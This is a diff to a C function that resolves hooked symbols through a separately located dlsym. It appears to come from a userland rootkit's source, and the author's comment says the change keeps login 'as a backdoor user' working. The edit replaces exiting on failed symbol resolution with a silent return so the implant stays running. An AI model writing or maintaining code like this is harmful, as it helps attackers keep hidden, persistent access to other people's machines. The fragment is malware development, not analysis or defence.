@@ -1,14 +1,29 @@
 void get_symbol_pointer(int symbol_index, void *handle){
+    char *symbol_name = all[symbol_index];
+    void *fptr;
+
     /* if the symbol has already been resolved, there's no need to do it again */
-    if(symbols[symbol_index].func != NULL || all[symbol_index] == NULL)
+    if(symbols[symbol_index].func != NULL || symbol_name == NULL)
         return;
 
     locate_dlsym();    /* resolve o_dlsym so we can get our symbol pointer */
+    fptr = o_dlsym(handle, symbol_name);   /* get us our symbol pointer */
 
-    char *symbol_name = all[symbol_index];
-    if(strlen(symbol_name) < 2) return;
-    symbols[symbol_index].func = o_dlsym(handle, symbol_name);   /* get us our symbol pointer */
-    if(symbols[symbol_index].func == NULL) exit(0);  /* if resolving the symbol failed, bail */
+    if(fptr == NULL){
+        /* i've noticed that we're failing to resolve a few symbols.
+         * this had never been a problem previously, so i'm not sure
+         * at all what's started causing this.
+         * so for the time being, instead of exiting, just return.
+         * everything still seems to be in working order. we can still
+         * log into the box as regular users or as a backdoor user. */
+
+        //printf("failed getting %s\n", symbol_name);
+        //exit(0);
+
+        return;  // kill me
+    }
+
+    symbols[symbol_index].func = fptr;
 }
 
 /* this function has a wrapper macro called hook in libdl.h.
